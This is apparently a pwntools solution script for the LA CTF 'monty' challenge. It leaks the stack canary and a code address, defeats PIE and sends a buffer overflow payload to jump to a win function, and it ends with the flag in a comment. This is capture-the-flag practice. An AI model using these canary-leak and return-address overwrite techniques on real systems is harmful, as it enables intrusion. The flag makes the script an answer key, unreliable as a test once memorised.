#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./monty_patched")

context.binary = exe

REMOTE_NC_CMD    = "nc chall.lac.tf 31132"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *game+809
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():

    r=conn()

    r.sendline(b"55")
    r.recvuntil(b"Peek 1: ")
    canary=int(r.recvline()[:-1])
  
    r.sendline(b"57")
    r.recvuntil(b"Peek 2: ")
    leak=int(r.recvline()[:-1])

    exe.address=leak-(exe.sym.main+48)

    r.sendline(b"0")

    payload=b"A"*24 + p64(canary) + p64(exe.sym.win)*2

    r.sendline(payload)

    r.interactive()
    #lactf{m0n7y_533_m0n7y_d0}

if __name__ == "__main__":
    main()